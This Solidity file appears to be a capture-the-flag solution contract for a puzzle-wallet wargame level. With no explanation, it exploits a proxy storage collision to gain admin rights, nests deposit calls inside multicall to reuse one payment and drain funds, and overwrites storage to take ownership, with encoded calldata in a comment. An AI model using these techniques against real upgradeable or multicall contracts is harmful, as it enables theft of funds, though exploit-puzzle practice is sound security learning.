// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWallet {
    function admin() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function multicall(bytes[] calldata data) external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleSolver69000 {
    IWallet public wallet;

    bytes deposit = abi.encodeWithSignature("deposit()");

    // bytes multideposit =
    //     abi.encodeWithSelector(wallet.deposit.selector, deposit);

    constructor(address _wallet) {
        wallet = IWallet(_wallet);
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
    }

    function moneyGlitch() public payable {
        bytes[] memory glitch = new bytes[](1);
        glitch[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory exp = new bytes[](2);
        exp[0] = glitch[0];
        exp[1] = abi.encodeWithSelector(wallet.multicall.selector, glitch);

        wallet.multicall{value: 0.002 ether}(exp);
        wallet.execute(msg.sender, 0.003 ether, "0x00");
    }

    function solve() external {
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        require(wallet.admin() == msg.sender, "fuck this");
    }

    receive() external payable {}

    fallback() external payable {}
}

//exp[] value:
//["0xd0e30db0","0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000"]
